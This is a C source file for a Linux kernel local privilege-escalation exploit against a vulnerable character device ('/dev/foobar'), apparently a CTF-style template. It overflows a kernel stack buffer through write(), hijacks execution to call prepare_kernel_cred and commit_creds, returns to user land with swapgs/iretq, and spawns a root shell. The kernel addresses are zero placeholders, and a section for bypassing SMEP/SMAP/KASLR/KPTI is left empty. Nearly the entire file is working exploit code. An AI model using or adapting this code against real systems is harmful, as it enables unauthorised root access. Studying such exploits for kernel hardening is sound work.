#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *VULN_DRV = "/dev/foobar";
uint64_t BUF_SZ = 0x400;
uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0x0;
uint64_t commit_creds = 0x0;

// =-=-=-=-=-=-=-=-=-=-=-=-=
// EXPLOIT HELPER FUNCTIONS
// =-=-=-=-=-=-=-=-=-=-=-=-=
void err(const char *msg) {
    perror(msg);
    exit(255);
}

int64_t open_dev() {
    int64_t fd = open(VULN_DRV, O_RDWR);
    if (fd == -1) {
        err("Failed to open device\n");
    }
    return fd;
}

void spawn_shell() {
    puts("[*] Hello from user-land");
    uid_t uid = getuid();
    if (uid == 0) {
        printf("[+] UID: %d, got root!\n", uid);
    } else {
        printf("[!] UID: %d, LPE failed!\n", uid);
        exit(EXIT_FAILURE);
    }
    system("/bin/sh");
}

uint64_t user_rip = (uint64_t) spawn_shell;

// =-=-=-=-=-=-=-=-=-=-=-=
// NO MITIGATIONS PRIVESC
// =-=-=-=-=-=-=-=-=-=-=-=
void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    puts("[+] Saved state");
}

void privesc() {
    __asm__(".intel_syntax noprefix;"
            "movabs rax, prepare_kernel_cred;"
            "xor rdi, rdi;"
            "call rax;"
            "mov rdi, rax;"
            "movabs rax, commit_creds;"
            "call rax;"
            "swapgs;"
            "mov r15, user_ss;"
            "push r15;"
            "mov r15, user_sp;"
            "push r15;"
            "mov r15, user_rflags;"
            "push r15;"
            "mov r15, user_cs;"
            "push r15;"
            "mov r15, user_rip;"
            "push r15;"
            "iretq;"
            ".att_syntax");
}

/*
 * With no mitigations in place we can just find out the addresses of prepare_kernel_cred and
 * commit_creds. To allow user-land code to be executed after our privilege escalation we
 * need to switch contexts (to a userland context). This can be done with iretq, which requires
 * the correct registers to be set up properly. To prepare them save_state can be used.
 */
void exploit(uint64_t fd) {
    save_state();
    uint64_t offset = BUF_SZ / sizeof(uint64_t);
    uint64_t bof_sz = (BUF_SZ + 0x40) / sizeof(uint64_t);
    uint64_t payload[bof_sz];

    payload[offset++] = 0x4242424242424242;
    payload[offset++] = (uint64_t) privesc;

    write(fd, payload, bof_sz * sizeof(uint64_t));
}

// =-=-=-=-=-=-=-=-=-=-=
// SMEP/SMAP/KASLR/KPTI
// =-=-=-=-=-=-=-=-=-=-=



// =-=-=-=-=-=-=-=-=-=-=
// MAIN
// =-=-=-=-=-=-=-=-=-=-=
int main() {
    int64_t fd = open_dev();
    exploit(fd);
    close(fd);
    return 0;
}   
